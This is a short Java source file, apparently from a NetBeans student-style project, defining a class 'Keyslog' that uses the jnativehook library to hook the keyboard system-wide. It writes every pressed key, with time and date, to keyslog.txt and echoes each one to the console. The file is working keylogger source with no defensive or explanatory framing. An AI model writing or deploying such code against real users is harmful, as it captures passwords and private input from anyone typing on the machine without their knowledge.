/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package User;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author Thanh Phuong
 */
public class Keyslog implements NativeKeyListener {

    File f = new File("keyslog.txt");    
    FileWriter fr = null;
    BufferedWriter br = null;    
    public static void Keyslog() {
        try {

            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new Keyslog());
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        try {
            fr = new FileWriter(f,true);
            br = new BufferedWriter(fr);
            br.write( NativeKeyEvent.getKeyText(e.getKeyCode()) + " \t " + java.time.LocalTime.now() + " \t " + java.time.LocalDate.now()+"\n" );
            //br.newLine();
            br.flush();
        } catch (IOException ex) {
            Logger.getLogger(Keyslog.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

    }

    public void nativeKeyTyped(NativeKeyEvent arg0) {

    }
    
}
